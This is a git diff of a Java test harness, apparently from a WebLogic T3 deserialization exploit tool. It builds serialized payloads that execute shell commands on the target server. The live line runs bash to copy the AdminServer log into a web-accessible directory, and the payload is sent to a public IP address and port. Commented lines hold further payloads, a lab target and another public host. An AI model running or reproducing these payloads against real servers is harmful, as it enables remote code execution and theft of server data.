@@ -1,33 +1,11 @@
-package com.supeream.weblogic;
+package com.supeream.test;
 
 import com.supeream.Main;
-import com.supeream.payload.RemoteImpl;
-import com.supeream.serial.BytesOperation;
 import com.supeream.serial.SerialDataGenerator;
-import com.supeream.serial.Serializables;
-import com.supeream.ssl.SocketFactory;
+import com.supeream.weblogic.T3ProtocolOperation;
 import org.apache.commons.cli.CommandLineParser;
 import org.apache.commons.cli.DefaultParser;
 import org.apache.commons.cli.Options;
-import weblogic.apache.org.apache.velocity.runtime.Runtime;
-import weblogic.cluster.singleton.ClusterMasterRemote;
-import weblogic.jndi.internal.NamingNode;
-import weblogic.protocol.Identity;
-import weblogic.rjvm.JVMID;
-import weblogic.rmi.cluster.ClusterableRemoteObject;
-import weblogic.rmi.cluster.ReplicaAwareRemoteObject;
-import weblogic.security.acl.internal.AuthenticatedUser;
-
-import javax.naming.Context;
-import javax.naming.InitialContext;
-import javax.naming.NamingEnumeration;
-import java.io.*;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
-import java.net.Inet4Address;
-import java.net.InetAddress;
-import java.net.Socket;
-import java.rmi.Remote;
 
 /**
  * Created by nike on 17/6/28.
@@ -37,12 +15,18 @@ public class T3Test {
     public static void main(String[] args) throws Exception {
 
         Options options = new Options();
-        options.addOption("https",false,"xx");
+        options.addOption("https", false, "xx");
         CommandLineParser parser = new DefaultParser();
         Main.cmdLine = parser.parse(options, args);
 
-        byte[] paload = SerialDataGenerator.serialBlindDatas(new String[]{"ping -c 3 112.126.81.222"});
-        T3ProtocolOperation.send("10.211.55.5", "7001", paload);
+//        byte[] paload = SerialDataGenerator.serialData1("open /Applications/Calculator.app");
+        byte[] paload = SerialDataGenerator.serialBlindDatas(new String[]{"/bin/bash", "-c", "cat /home/weblogic/bea/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log>'/home/weblogic/bea/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/xx.txt'"});
+//        byte[] paload = SerialDataGenerator.serialBlindDatas(new String[]{"/bin/bash","-c","head -n 300 /home/weblogic/bea/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log>'/home/weblogic/bea/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/xx.txt'"});
+
+        T3ProtocolOperation.send("1.202.242.118", "4567", paload);
+
+//        byte[] paload = SerialDataGenerator.serialRmiDatas(new String[]{"install"});
+//        T3ProtocolOperation.send("10.211.55.5", "7001", paload);
 
 //
 //
@@ -205,7 +189,6 @@ public class T3Test {
 //        System.setProperty("UseSunHttpHandler","true");
 //        System.setProperty("ssl.SocketFactory.provider" , "sun.security.ssl.SSLSocketFactoryImpl");
 //        System.setProperty("ssl.ServerSocketFactory.provider" , "sun.security.ssl.SSLSocketFactoryImpl");
-
 
 
 //        Context initialContext = Main.getInitialContext("t3s://" + "77.246.34.226" + ":" + 443);
